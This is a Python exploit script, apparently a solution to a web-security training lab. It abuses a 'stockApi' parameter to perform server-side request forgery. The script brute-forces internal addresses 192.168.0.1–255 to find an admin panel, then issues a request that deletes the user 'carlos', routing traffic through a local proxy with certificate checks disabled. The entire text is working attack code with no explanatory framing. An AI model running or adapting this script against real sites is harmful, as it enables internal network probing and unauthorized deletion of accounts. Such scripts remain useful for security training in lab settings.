import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
def check_admin_hostname(url):
    check_stock_path = "/product/stock"
    admin_ip_address = ""
    for i in range(1,256):
        hostname = f"http://192.168.0.{i}:8080/admin"
        params = {'stockApi': hostname}
        r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
        if r.status_code == 200:
            admin_ip_address = f"192.168.0.{i}"
            break

    if admin_ip_address == "":
        print("(-) Could't find admin hostname")
    return admin_ip_address

def delete_user(url, admin_ip_address):
    delete_user_url_ssrf_payload = f"http://{admin_ip_address}:8080/admin/delete?username=carlos"
    check_stock_path = "/product/stock"
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    check_admin_url_ssrf_payload = f"http://{admin_ip_address}:8080/admin"
    params2 = {'stockApi': check_admin_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'User deleted successfully!' in r.text:
        print("(+) User deleted Successfully")
    else:
        print("(-) Unsuccessfull exploit")

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage Instruction: {sys.argv[0]} <URL>")
        print(f"(+) Example: {sys.argv[0]} www.domain.com")

    url = sys.argv[1]
    print("(+) Finding admin hostname")
    admin_ip_address = check_admin_hostname(url)
    print("(+) Found the admin ip address")
    print("(+) Deleting user carlos")
    delete_user(url, admin_ip_address)

if __name__ == "__main__":
    main()
